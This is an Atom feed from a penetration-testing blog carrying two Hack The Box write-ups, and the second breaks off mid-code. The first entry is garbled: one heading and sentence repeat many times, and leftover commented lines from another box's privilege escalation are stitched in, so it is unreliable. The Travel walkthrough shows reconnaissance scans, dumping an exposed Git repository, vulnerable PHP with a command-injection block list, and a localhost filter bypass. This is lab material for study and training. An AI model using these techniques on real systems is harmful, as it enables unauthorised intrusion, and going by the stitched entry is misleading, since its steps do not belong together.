<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="https://226218.io/feed.xml" rel="self" type="application/atom+xml" /><link href="https://226218.io/" rel="alternate" type="text/html" /><updated>2023-08-14T05:43:39-04:00</updated><id>https://226218.io/feed.xml</id><title type="html">thi0x portfolio</title><subtitle>Posts about HTB Solution, cyber security and networking</subtitle><author><name>thi0x</name><email>amir.mehrez.garcia@gmail.com</email></author><entry><title type="html">Appointment - Hack The Box</title><link href="https://226218.io/htb-appointment/" rel="alternate" type="text/html" title="Appointment - Hack The Box" /><published>2023-08-13T00:00:00-04:00</published><updated>2023-08-13T00:00:00-04:00</updated><id>https://226218.io/htb-appointment</id><content type="html" xml:base="https://226218.io/htb-appointment/">&lt;p&gt;&lt;img src=&quot;/assets/images/htb-appointment/appointment_logo.png&quot; alt=&quot;&quot; /&gt;
Appointment is a machine of Starting Point of HTB. The machine has a PHP web app and the objetive is find a command injection vulnerability in the site to claim the flag.&lt;/p&gt;

&lt;h2 id=&quot;1st-htb-vpn-connection&quot;&gt;1st HTB VPN connection&lt;/h2&gt;

&lt;p&gt;The initials goals of the HTB in this Starting Point are connect with the machine. We only need download vpn and connect with OVPN&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-appointment/answer.png&quot; alt=&quot;image-20200519201954045&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;2nd-htb-vpn-connection&quot;&gt;2nd HTB VPN connection&lt;/h2&gt;

&lt;p&gt;The initials goals of the HTB in this Starting Point are connect with the machine. We only need download vpn and connect with OVPN&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-appointment/answer1.png&quot; alt=&quot;image-20200519201954045&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;1st-htb-vpn-connection-1&quot;&gt;1st HTB VPN connection&lt;/h2&gt;

&lt;p&gt;The initials goals of the HTB in this Starting Point are connect with the machine. We only need download vpn and connect with OVPN&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-appointment/answer2.png&quot; alt=&quot;image-20200519201954045&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;1st-htb-vpn-connection-2&quot;&gt;1st HTB VPN connection&lt;/h2&gt;

&lt;p&gt;The initials goals of the HTB in this Starting Point are connect with the machine. We only need download vpn and connect with OVPN&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-appointment/answer3.png&quot; alt=&quot;image-20200519201954045&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;1st-htb-vpn-connection-3&quot;&gt;1st HTB VPN connection&lt;/h2&gt;

&lt;p&gt;The initials goals of the HTB in this Starting Point are connect with the machine. We only need download vpn and connect with OVPN&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-appointment/answer4.png&quot; alt=&quot;image-20200519201954045&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;1st-htb-vpn-connection-4&quot;&gt;1st HTB VPN connection&lt;/h2&gt;

&lt;p&gt;The initials goals of the HTB in this Starting Point are connect with the machine. We only need download vpn and connect with OVPN&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-appointment/answer5.png&quot; alt=&quot;image-20200519201954045&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;1st-htb-vpn-connection-5&quot;&gt;1st HTB VPN connection&lt;/h2&gt;

&lt;p&gt;The initials goals of the HTB in this Starting Point are connect with the machine. We only need download vpn and connect with OVPN&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-appointment/answer6.png&quot; alt=&quot;image-20200519201954045&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;1st-htb-vpn-connection-6&quot;&gt;1st HTB VPN connection&lt;/h2&gt;

&lt;p&gt;The initials goals of the HTB in this Starting Point are connect with the machine. We only need download vpn and connect with OVPN&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-appointment/answer7.png&quot; alt=&quot;image-20200519201954045&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;1st-htb-vpn-connection-7&quot;&gt;1st HTB VPN connection&lt;/h2&gt;

&lt;p&gt;The initials goals of the HTB in this Starting Point are connect with the machine. We only need download vpn and connect with OVPN&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-appointment/answer8.png&quot; alt=&quot;image-20200519201954045&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;1st-htb-vpn-connection-8&quot;&gt;1st HTB VPN connection&lt;/h2&gt;

&lt;p&gt;The initials goals of the HTB in this Starting Point are connect with the machine. We only need download vpn and connect with OVPN&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-appointment/answer9.png&quot; alt=&quot;image-20200519201954045&quot; /&gt;&lt;/p&gt;

&lt;p&gt;#Then we’ll change the Group ID to 27 (sudo) so our user will be able to become root once we have a shell.&lt;/p&gt;

&lt;p&gt;#&lt;img src=&quot;/assets/images/htb-writeup-travel/image-20200519223450128.png&quot; alt=&quot;image-20200519223450128&quot; /&gt;&lt;/p&gt;

&lt;p&gt;#To add an SSH public key, we need to add the &lt;strong&gt;ldapPublicKey&lt;/strong&gt; object class first.&lt;/p&gt;

&lt;p&gt;#&lt;img src=&quot;/assets/images/htb-writeup-travel/image-20200519223537871.png&quot; alt=&quot;image-20200519223537871&quot; /&gt;&lt;/p&gt;

&lt;p&gt;#Then we can add the &lt;strong&gt;sshPublic&lt;/strong&gt; attribute and put our SSH key there.&lt;/p&gt;

&lt;p&gt;#&lt;img src=&quot;/assets/images/htb-writeup-travel/image-20200519223658288.png&quot; alt=&quot;image-20200519223658288&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;last-step-to-root&quot;&gt;Last step to root&lt;/h2&gt;

&lt;p&gt;#Now we can SSH to the server using RSA authentication then use the sudo command with the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;welcome123&lt;/code&gt; password we set earlier in the LDAP server.&lt;/p&gt;

&lt;p&gt;#&lt;img src=&quot;/assets/images/htb-writeup-travel/image-20200519223748937.png&quot; alt=&quot;image-20200519223748937&quot; /&gt;&lt;/p&gt;</content><author><name>thi0x</name><email>amir.mehrez.garcia@gmail.com</email></author><category term="hackthebox" /><category term="sql_injection" /><category term="php" /><category term="mysql" /><category term="injection" /><category term="A03:2021" /><summary type="html">Appointment is a machine of Starting Point of HTB. The machine has a PHP web app and the objetive is find a command injection vulnerability in the site to claim the flag.</summary></entry><entry><title type="html">Travel - Hack The Box</title><link href="https://226218.io/htb-writeup-travel/" rel="alternate" type="text/html" title="Travel - Hack The Box" /><published>2020-09-05T00:00:00-04:00</published><updated>2020-09-05T00:00:00-04:00</updated><id>https://226218.io/htb-writeup-travel</id><content type="html" xml:base="https://226218.io/htb-writeup-travel/">&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-travel/travel_logo.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Travel is an awesome box from my ATeam teammates &lt;a href=&quot;https://twitter.com/xct_de&quot;&gt;xct&lt;/a&gt; and &lt;a href=&quot;https://twitter.com/ATeamJKR&quot;&gt;jkr&lt;/a&gt;. The box has a code review part where we analyze the source code of a PHP web app to find a command injection vulnerability in a curl command. We then use the Gopher protocol to perform SSRF and write a serialized PHP payload into the memcache database. For the priv esc part, we manipulate attributes of a user in an LDAP database which is used by the NSS facility to extend the Linux authentication database.&lt;/p&gt;

&lt;h2 id=&quot;portscan&quot;&gt;Portscan&lt;/h2&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;snowscan@kali:~/htb/travel$ sudo nmap -sC -sV -p- 10.10.10.189
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-19 20:14 EDT
Nmap scan report for travel.htb (10.10.10.189)
Host is up (0.018s latency).
Not shown: 65532 closed ports
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http     nginx 1.17.6
|_http-server-header: nginx/1.17.6
|_http-title: Travel.HTB
443/tcp open  ssl/http nginx 1.17.6
|_http-server-header: nginx/1.17.6
|_http-title: Travel.HTB - SSL coming soon.
| ssl-cert: Subject: commonName=www.travel.htb/organizationName=Travel.HTB/countryName=UK
| Subject Alternative Name: DNS:www.travel.htb, DNS:blog.travel.htb, DNS:blog-dev.travel.htb
| Not valid before: 2020-04-23T19:24:29
|_Not valid after:  2030-04-21T19:24:29
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 31.95 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We can see 3 vhosts in the TLS certificate:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;www.travel.htb&lt;/li&gt;
  &lt;li&gt;blog.travel.htb&lt;/li&gt;
  &lt;li&gt;blog-dev.travel.htb&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;1st-website---wwwtravelhtb&quot;&gt;1st website - www.travel.htb&lt;/h2&gt;

&lt;p&gt;There’s nothing interesting on the main web page: it’s just a static webpage with a non-functional susbcription form at the bottom. The other vhosts we found when running the nmap scan are probably where we want to go look next.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-travel/image-20200519201954045.png&quot; alt=&quot;image-20200519201954045&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;2nd-website---blogtravelhtb&quot;&gt;2nd website - blog.travel.htb&lt;/h2&gt;

&lt;p&gt;The blog page runs a Wordpress instance and the main page contains a hint about a new RSS feature being released soon from the dev team. This is probably what we will want to look at next.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-travel/image-20200519202315537.png&quot; alt=&quot;image-20200519202315537&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-travel/image-20200519202412080.png&quot; alt=&quot;image-20200519202412080&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We can run wpscan to check for low hanging fruits like configuration backups and so on but we don’t find anything interesting.  There’s only a single administrator account and because this is a Hard box, there isn’t any brute-forcing involved.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-travel/image-20200519202607209.png&quot; alt=&quot;image-20200519202607209&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-travel/image-20200519202717337.png&quot; alt=&quot;image-20200519202717337&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;3nd-website---blog-devtravelhtb&quot;&gt;3nd website - blog-dev.travel.htb&lt;/h2&gt;

&lt;p&gt;We don’t have access to the blog-dev page because there’s probably an .htaccess config file in there to prevent directory indexing.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-travel/image-20200519202202984.png&quot; alt=&quot;image-20200519202202984&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Just because directory indexing is disabled doesn’t mean we can’t look for other stuff that may be hidden. We’ll use ffuf to fuzz files and directories and we find a Git repository.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;snowscan@kali:~/htb/travel$ ffuf -t 50 -w $WLRC -u http://blog-dev.travel.htb/FUZZ

        /&apos;___\  /&apos;___\           /&apos;___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.1.0-git
________________________________________________

 :: Method           : GET
 :: URL              : http://blog-dev.travel.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 50
 :: Matcher          : Response status: 200,204,301,302,307,401,403
________________________________________________

.git/HEAD               [Status: 200, Size: 23, Words: 2, Lines: 2]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;dumping-the-git-repo-files&quot;&gt;Dumping the Git repo files&lt;/h2&gt;

&lt;p&gt;Using &lt;a href=&quot;https://github.com/arthaud/git-dumper&quot;&gt;git-dumper&lt;/a&gt;, we can can download the entire Git repository:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;snowscan@kali:~/htb/travel/tmp$ ~/tools/git-dumper/git-dumper.py http://blog-dev.travel.htb .
[-] Testing http://blog-dev.travel.htb/.git/HEAD [200]
[-] Testing http://blog-dev.travel.htb/.git/ [403]
[-] Fetching common files
[-] Fetching http://blog-dev.travel.htb/.gitignore [404]
[-] Fetching http://blog-dev.travel.htb/.git/COMMIT_EDITMSG [200]
[-] Fetching http://blog-dev.travel.htb/.git/description [200]
[-] Fetching http://blog-dev.travel.htb/.git/hooks/applypatch-msg.sample [200]
[-] Fetching http://blog-dev.travel.htb/.git/hooks/post-commit.sample [404]
[-] Fetching http://blog-dev.travel.htb/.git/hooks/commit-msg.sample [200]
[-] Fetching http://blog-dev.travel.htb/.git/hooks/pre-applypatch.sample [200]
[-] Fetching http://blog-dev.travel.htb/.git/hooks/post-receive.sample [404]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;first-glance-at-the-php-source-code&quot;&gt;First glance at the PHP source code&lt;/h2&gt;

&lt;p&gt;There’s only one commit in the repo so we won’t have to look for leftover credentials that were removed by a second commit or anything like that.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-travel/image-20200519203730705.png&quot; alt=&quot;image-20200519203730705&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The repo contains three files:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;rss_template.php&lt;/li&gt;
  &lt;li&gt;template.php&lt;/li&gt;
  &lt;li&gt;README.md&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;We’ll start by reading the instructions in the readme file to understand what this repo contains:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# Rss Template Extension

Allows rss-feeds to be shown on a custom wordpress page.

## Setup

* `git clone https://github.com/WordPress/WordPress.git`
* copy rss_template.php &amp;amp; template.php to `wp-content/themes/twentytwenty`
* create logs directory in `wp-content/themes/twentytwenty`
* create page in backend and choose rss_template.php as theme

## Changelog

- temporarily disabled cache compression
- added additional security checks
- added caching
- added rss template
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The readme tells us there’s a custom RSS feed PHP application in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wp-content/themes/twentytwenty&lt;/code&gt; along with the log directory location. It also mentions that caching has been added. This is interesting because this could mean we have to interact with redis or memcache later.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;rss_template&lt;/strong&gt; is the main PHP code and contains a couple of interesting parts:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;It’s using memcache to store the generated content for up to 60 seconds and it uses _xct as the prefix for the key.
    &lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;url_get_contents&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;nv&quot;&gt;$simplepie&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;SimplePie&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
      &lt;span class=&quot;nv&quot;&gt;$simplepie&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;set_cache_location&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;memcache://127.0.0.1:11211/?timeout=60&amp;amp;prefix=xct_&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;c1&quot;&gt;//$simplepie-&amp;gt;set_raw_data($data);&lt;/span&gt;
      &lt;span class=&quot;nv&quot;&gt;$simplepie&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;set_feed_url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;nv&quot;&gt;$simplepie&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;init&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
      &lt;span class=&quot;nv&quot;&gt;$simplepie&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;handle_content_type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;The URL of the custom feed is passed through the &lt;strong&gt;custom_feed_url&lt;/strong&gt; parameter.
    &lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_SERVER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;QUERY_STRING&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;strpos&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;custom_feed_url&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!==&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$tmp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;explode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;=&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt; 	
&lt;span class=&quot;nv&quot;&gt;$url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;end&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$tmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; 	
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;http://www.travel.htb/newsfeed/customfeed.xml&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;There’s a &lt;strong&gt;debug.php&lt;/strong&gt; script that can be enabled by setting the debug parameter in the GET request
    &lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;&amp;lt;!--
DEBUG
&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;isset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;debug&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])){&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;include&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;debug.php&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;
--&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;The other file, &lt;strong&gt;template.php&lt;/strong&gt; contains a function that filters the custom_feed_url parameter in an attempt to prevent SSRF’s and local file inclusion attacks. The filter is easily bypassed by using the 0 IP address value instead of 127.0.0.1 to reach localhost.&lt;/p&gt;

&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;safe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
	&lt;span class=&quot;c1&quot;&gt;// this should be secure&lt;/span&gt;
	&lt;span class=&quot;nv&quot;&gt;$tmpUrl&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;urldecode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;strpos&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$tmpUrl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;file://&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!==&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;or&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;strpos&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$tmpUrl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;@&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!==&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;		
		&lt;span class=&quot;k&quot;&gt;die&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;h2&amp;gt;Hacking attempt prevented (LFI). Event has been logged.&amp;lt;/h2&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;strpos&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$tmpUrl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;-o&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!==&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;or&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;strpos&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$tmpUrl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;-F&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!==&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;		
		&lt;span class=&quot;k&quot;&gt;die&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;h2&amp;gt;Hacking attempt prevented (Command Injection). Event has been logged.&amp;lt;/h2&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
	&lt;span class=&quot;nv&quot;&gt;$tmp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;parse_url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;PHP_URL_HOST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;c1&quot;&gt;// preventing all localhost access&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$tmp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;localhost&quot;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;or&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$tmp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;127.0.0.1&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
